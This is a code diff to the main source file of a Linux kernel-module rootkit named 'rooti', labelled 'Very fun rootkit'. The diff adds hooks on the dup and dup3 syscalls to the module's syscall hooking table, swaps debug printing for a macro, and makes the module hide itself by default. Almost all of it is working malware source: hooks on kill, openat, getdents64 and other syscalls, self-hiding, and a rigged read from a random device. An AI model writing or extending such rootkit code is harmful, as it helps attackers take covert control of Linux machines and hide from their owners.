@@ -16,6 +16,7 @@
 #include "capabilities/privilege.h"
 #include "capabilities/track.h"
 #include "capabilities/hide.h"
+#include "utils.h"
 #include "config.h"
 
 MODULE_LICENSE("GPL");
@@ -23,7 +24,7 @@ MODULE_AUTHOR("Omri Ben Zikri");
 MODULE_DESCRIPTION("Very fun rootkit");
 MODULE_VERSION("1.0.0");
 
-// Unused signal numbers can, be used by the rootkit for its own purposes
+// Unused signal numbers which can be used by the rootkit for its own purposes
 enum rooti_signals {
     ROOTI_SIG_HIDE = 63,  // toogle hiding of this kernel module
     ROOTI_SIG_REG = 64    // request by a usermode process to be serviced by the rootkit
@@ -47,7 +48,9 @@ struct list_head *rooti_tracked_fds_lists[] = {
 static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
 static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
 static asmlinkage long (*orig_close)(const struct pt_regs *regs);
+static asmlinkage long (*orig_dup)(const struct pt_regs *regs);
 static asmlinkage long (*orig_dup2)(const struct pt_regs *regs);
+static asmlinkage long (*orig_dup3)(const struct pt_regs *regs);
 static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 
@@ -85,14 +88,14 @@ static asmlinkage long hook_openat(const struct pt_regs *regs)
     char *filepath_user = (char *)regs->si;
     char *filepath_kernel = kmalloc(NAME_MAX, GFP_KERNEL);
     if (filepath_kernel == NULL) {
-        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+        ROOTI_DEBUG("failed to allocate memory");
         return orig_openat(regs);
     }
 
     // Copy the requested filename to the kernel mode buffer
     int err = copy_from_user(filepath_kernel, filepath_user, NAME_MAX);
     if (err > 0) {
-        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
+        ROOTI_DEBUG("copy_from_user() failed: %d", err);
         kfree(filepath_kernel);
         return orig_openat(regs);
     }
@@ -131,11 +134,51 @@ static asmlinkage long hook_close(const struct pt_regs *regs)
     return orig_close(regs);
 }
 
+static asmlinkage long hook_dup(const struct pt_regs *regs)
+{
+    pid_t pid = current->pid;
+    int oldfd = regs->di;
+    int newfd = orig_dup(regs);
+
+    struct rooti_tracked_fd *record;
+    struct rooti_tracked_fd *tmp;
+
+    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
+        // If present, duplicate the recorded FD
+        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
+            if (pid == record->pid && oldfd == record->fd) {
+                rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
+            }
+        }
+    }
+    return newfd;
+}
+
 static asmlinkage long hook_dup2(const struct pt_regs *regs)
 {
     pid_t pid = current->pid;
     int oldfd = regs->di;
     int newfd = orig_dup2(regs);
+
+    struct rooti_tracked_fd *record;
+    struct rooti_tracked_fd *tmp;
+
+    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
+        // If present, duplicate the recorded FD
+        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
+            if (pid == record->pid && oldfd == record->fd) {
+                rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
+            }
+        }
+    }
+    return newfd;
+}
+
+static asmlinkage long hook_dup3(const struct pt_regs *regs)
+{
+    pid_t pid = current->pid;
+    int oldfd = regs->di;
+    int newfd = orig_dup3(regs);
 
     struct rooti_tracked_fd *record;
     struct rooti_tracked_fd *tmp;
@@ -217,14 +260,14 @@ static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
     size_t len = iov_iter_count(iter);
     char *kernel_buf = kzalloc(len, GFP_KERNEL);
     if (kernel_buf == NULL) {
-        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+        ROOTI_DEBUG("failed to allocate memory");
         return -ENOMEM;
     }
 
     // Copy the rigged buffer back into userspace
     int err = copy_to_iter(kernel_buf, len, iter);
     if (!err) {
-        printk(KERN_DEBUG "rooti: copy_to_iter() failed\n");
+        ROOTI_DEBUG("copy_to_iter() failed: %d", err);
         kfree(kernel_buf);
         return -EFAULT;
     }
@@ -238,7 +281,9 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_openat"), hook_openat, &orig_openat),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_close"), hook_close, &orig_close),
+    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup"), hook_dup, &orig_dup),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup2"), hook_dup2, &orig_dup2),
+    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup3"), hook_dup3, &orig_dup3),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64)
 };
@@ -256,37 +301,37 @@ struct rooti_seq_ops_hook seq_ops_hooks[] = {
 /* LKM initialization */
 static int __init rooti_init(void)
 {
-    printk(KERN_INFO "rooti: init\n");
+    ROOTI_DEBUG("init");
     
     int ret = rooti_hooking_init();
     if (ret < 0) {
-        printk(KERN_DEBUG "rooti: rooti_hooking_init() failed: %d\n", ret);
+        ROOTI_DEBUG("rooti_hooking_init() failed: %d", ret);
         return ret;
     }
 
     // Install function hooks :D
     ret = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
     if (ret < 0) {
-        printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
+        ROOTI_DEBUG("rooti_install_hooks() failed: %d", ret);
         return ret;
     }
 
     // Install file operation hooks :D
     ret = rooti_install_file_ops_hooks(file_ops_hooks, ARRAY_SIZE(file_ops_hooks));
     if (ret < 0) {
-        printk(KERN_DEBUG "rooti: rooti_install_file_ops_hooks() failed: %d\n", ret);
+        ROOTI_DEBUG("rooti_install_file_ops_hooks() failed: %d", ret);
         return ret;
     }
 
     // Install seq operations hooks :D
     ret = rooti_install_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));
     if (ret < 0) {
-        printk(KERN_DEBUG "rooti: rooti_install_seq_ops_hooks() failed: %d\n", ret);
+        ROOTI_DEBUG("rooti_install_seq_ops_hooks() failed: %d", ret);
         return ret;
     }
 
     // If configured to be hidden by default, hide this rootkit
-#ifdef ROOTI_HIDEME_DEFAULT
+#ifndef ROOTI_SHOWME_DEFAULT
     rooti_hideme();
 #endif
 
@@ -296,7 +341,8 @@ static int __init rooti_init(void)
 /* LKM cleanup */
 static void __exit rooti_exit(void)
 {
-    printk(KERN_INFO "rooti: exit\n");
+    ROOTI_DEBUG("exit");
+
     rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
     rooti_uninstall_file_ops_hooks(file_ops_hooks, ARRAY_SIZE(file_ops_hooks));
     rooti_uninstall_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));
